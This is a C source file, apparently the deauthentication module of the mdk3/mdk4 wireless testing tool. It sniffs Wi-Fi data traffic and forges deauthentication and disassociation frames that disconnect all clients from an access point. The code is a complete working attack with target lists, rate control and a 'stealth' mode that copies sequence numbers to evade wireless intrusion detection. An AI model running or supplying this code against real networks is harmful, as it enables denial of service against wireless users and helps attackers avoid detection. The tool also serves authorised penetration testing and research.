#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

#include "deauth.h"
#include "../osdep.h"
#include "../channelhopper.h"
#include "../greylist.h"
#include "../helpers.h"

#define DEAUTH_MODE 'd'
#define DEAUTH_NAME "Deauthentication and Disassociation"

#define LIST_REREAD_PERIOD 3

struct deauth_options {
  char *greylist;
  unsigned char isblacklist;
  unsigned int speed;
  int stealth;
};

//Global things, shared by packet creation and stats printing
struct ether_addr bssid, station;

void deauth_shorthelp()
{
  printf("  Sends deauthentication and disassociation packets to stations\n");
  printf("  based on data traffic to disconnect all clients from an AP.\n");
}

void deauth_longhelp()
{
  printf( "  Sends deauthentication and disassociation packets to stations\n"
	  "  based on data traffic to disconnect all clients from an AP.\n"
	  "      -w <filename>\n"
	  "         Read file containing MACs not to care about (Whitelist mode)\n"
	  "      -b <filename>\n"
	  "         Read file containing MACs to run test on (Blacklist Mode)\n"
	  "      -s <pps>\n"
	  "         Set speed in packets per second (Default: unlimited)\n"
          "      -x\n"
          "         Enable full IDS stealth by matching all Sequence Numbers\n"
          "         Packets will only be sent with clients' adresses\n"
	  "      -c [chan,chan,...,chan[:speed]]\n"
	  "         Enable channel hopping. When -c h is given, mdk3 will hop an all\n"
	  "         14 b/g channels. Channel will be changed every 3 seconds,\n"
	  "         if speed is not specified. Speed value is in milliseconds!\n");
}


void *deauth_parse(int argc, char *argv[]) {
  int opt, speed;
  char *speedstr;
  struct deauth_options *dopt = malloc(sizeof(struct deauth_options));
  
  dopt->greylist = NULL;
  dopt->isblacklist = 0;
  dopt->speed = 0;
  dopt->stealth = 0;

  while ((opt = getopt(argc, argv, "w:b:s:xc:")) != -1) {
    switch (opt) {
      case 'w':
	if (dopt->isblacklist || dopt->greylist) {
	  printf("Only one -w or -b may be selected once\n"); return NULL; }
	dopt->greylist = malloc(strlen(optarg) + 1); strcpy(dopt->greylist, optarg);
      break;
      case 'b':
	if (dopt->isblacklist || dopt->greylist) {
	  printf("Only one -w or -b may be selected once\n"); return NULL; }
	dopt->greylist = malloc(strlen(optarg) + 1); strcpy(dopt->greylist, optarg);
	dopt->isblacklist = 1;
      break;
      case 's':
	dopt->speed = (unsigned int) atoi(optarg);
      break;
      case 'x':
        dopt->stealth = 1;
      break;
      case 'c':
	speed = 3000000;
	speedstr = strrchr(optarg, ':');
	if (speedstr != NULL) {
	  speed = 1000 * atoi(speedstr + 1);
	}
	if (optarg[0] == 'h') {
	  init_channel_hopper(NULL, speed);
	} else {
	  init_channel_hopper(optarg, speed);
	}
      break;
      default:
	deauth_longhelp();
	printf("\n\nUnknown option %c\n", opt);
	return NULL;
    }
  }
  
  return (void *) dopt;
}


unsigned char accept_target(struct packet *pkt, unsigned char isblacklist, char *greylist) {
  struct ieee_hdr *hdr = (struct ieee_hdr *) pkt->data;
  
  if (! greylist) return 1;	//Always accept when no black/whitelisting selected
  
  // If any of the Adresses is Blacklisted, ACCEPT target
  if (isblacklist) {
    if (is_blacklisted(hdr->addr1)) return 1;
    if (is_blacklisted(hdr->addr2)) return 1;
    if (is_blacklisted(hdr->addr3)) return 1;
  // IF any of the Adresses is Whitelisted, SKIP target
  } else {
    if (is_whitelisted(hdr->addr1)) return 0;
    if (is_whitelisted(hdr->addr2)) return 0;
    if (is_whitelisted(hdr->addr3)) return 0;
    if ((hdr->flags & 0x03) == 0x03) { //WDS...
      struct ether_addr *fourth = get_source(pkt);
      if (is_whitelisted(*fourth)) return 0;
    }
    return 1;
  }
  
  return 0;
}


unsigned char get_new_target(struct ether_addr *client, struct ether_addr *ap, unsigned char isblacklist, char *greylist, int stealth) {
  struct packet sniffed;
  struct ieee_hdr *hdr;
  unsigned char wds = 0;
  
  while(1) {
    sniffed = osdep_read_packet();
    if (sniffed.len == 0) exit(-1);
    
    hdr = (struct ieee_hdr *) sniffed.data;
    
    if ((hdr->type != IEEE80211_TYPE_DATA) && (hdr->type != IEEE80211_TYPE_QOSDATA)) continue;
    if (stealth && ((hdr->flags & 0x03) != 0x01)) continue; //In stealth mode do not impersonate AP, IDS will figure out the duplicate SEQ number!

    if (accept_target(&sniffed, isblacklist, greylist)) break;
  }
  
  switch (hdr->flags & 0x03) {
    case 0x03: //WDS
      wds = 1;
      MAC_COPY(*client, hdr->addr1);
      MAC_COPY(*ap, hdr->addr2);
    break;
    case 0x01: //ToDS
      MAC_COPY(*client, hdr->addr2);
      MAC_COPY(*ap, hdr->addr1);
    break;
    case 0x02: //FromDS
      MAC_COPY(*client, hdr->addr1);
      MAC_COPY(*ap, hdr->addr2);
    break;
    case 0x00: //NoDS (AdHoc)
      MAC_COPY(*client, hdr->addr2);
      MAC_COPY(*ap, hdr->addr3);
    break;
  }
  
  set_seqno(NULL, get_seqno(&sniffed));  // Eff you, WIDS

  return wds;
}


struct packet deauth_getpacket(void *options) {
  struct deauth_options *dopt = (struct deauth_options *) options;
  static time_t t_prev = 0;
  static unsigned char wds, state = 0;
  
  if (dopt->greylist) {
    if (t_prev == 0) {
      printf("Periodically re-reading blacklist/whitelist every %d seconds\n\n", LIST_REREAD_PERIOD);
    }
    if ((time(NULL) - t_prev) >= LIST_REREAD_PERIOD) {
      t_prev = time(NULL);
      load_greylist(dopt->isblacklist, dopt->greylist);
    }
  }
  
  if (dopt->speed) sleep_till_next_packet(dopt->speed);
  
  switch (state) {
    case 0:
      wds = get_new_target(&station, &bssid, dopt->isblacklist, dopt->greylist, dopt->stealth);
      state = 1;
      return create_deauth(bssid, station, bssid);
    break;
    case 1:
      state = 2;
      if (wds) state = 4;
      if (dopt->stealth) state = 0;
      return create_disassoc(bssid, station, bssid);
    break;
    case 2:
      state = 3;
      return create_deauth(station, bssid, bssid);
    break;
    case 3:
      state = 0;
      return create_disassoc(station, bssid, bssid);
    break;
    case 4:
      state = 5;
      return create_deauth(station, bssid, station);
    break;
    case 5:
      state = 0;
      return create_disassoc(station, bssid, station);
    break;
  }

  printf("\nIMPOSSIBLE!\n"); exit(-1);
}


void deauth_print_stats(void *options) {
  int chan = osdep_get_channel();
  options = options; //Avoid unused warning
  
  printf("\rDisconnecting "); print_mac(station);
  printf(" from "); print_mac(bssid);
  
  if (chan) {
    printf(" on channel %d\n", chan);
  } else {
    printf("\n");
  }
}


void deauth_perform_check(void *options) {
  //Nothing to check for beacon flooding attacks
  options = options; //Avoid unused warning
}


struct attacks load_deauth() {
  struct attacks this_attack;
  char *deauth_name = malloc(strlen(DEAUTH_NAME) + 1);
  strcpy(deauth_name, DEAUTH_NAME);

  this_attack.print_shorthelp = (fp) deauth_shorthelp;
  this_attack.print_longhelp = (fp) deauth_longhelp;
  this_attack.parse_options = (fpo) deauth_parse;
  this_attack.get_packet = (fpp) deauth_getpacket;
  this_attack.print_stats = (fps) deauth_print_stats;
  this_attack.perform_check = (fps) deauth_perform_check;
  this_attack.mode_identifier = DEAUTH_MODE;
  this_attack.attack_name = deauth_name;

  return this_attack;
}
